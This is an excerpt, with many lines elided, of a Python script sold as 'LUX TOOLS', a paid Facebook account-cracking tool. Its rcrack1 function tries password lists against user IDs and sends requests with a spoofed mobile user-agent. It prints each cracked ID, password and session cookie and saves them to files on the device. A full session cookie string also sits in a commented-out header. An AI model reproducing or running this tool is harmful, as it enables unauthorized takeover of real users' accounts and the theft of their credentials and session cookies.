...
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO LUX TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
\033[1;32m[-] AUTHOR    :\033[1;32m Fazla Alahi
\033[1;32m[-] GITHUB    :\033[1;32m LUX-XXX
\033[1;32m[-] FACEBOOK  :\033[1;32m FH Roman
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS LUX BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mLUX\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    # 'cookie': 'datr=7i9FZfB4lBkOrFK78-Wiojt2; sb=7i9FZdj5E9tOsaSkgLvhmKeG; locale=en_US; wl_cbv=v2%3Bclient_version%3A2352%3Btimestamp%3A1699284338; vpd=v1%3B439x400x1.8000000715255737; m_pixel_ratio=1.8000000715255737; wd=400x750; fr=0XTOvazWqz8SsAo8H.AWVsHGf6w7pkLppJK4TG1MIhVDo.BlRS_u.iN.AAA.0.0.BlSQ3s.AWULZYDFkM4',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[LUX-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/LUX/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[LUX-CP❌] {uid}|{ps}")
                open('/sdcard/LUX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[LUX-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
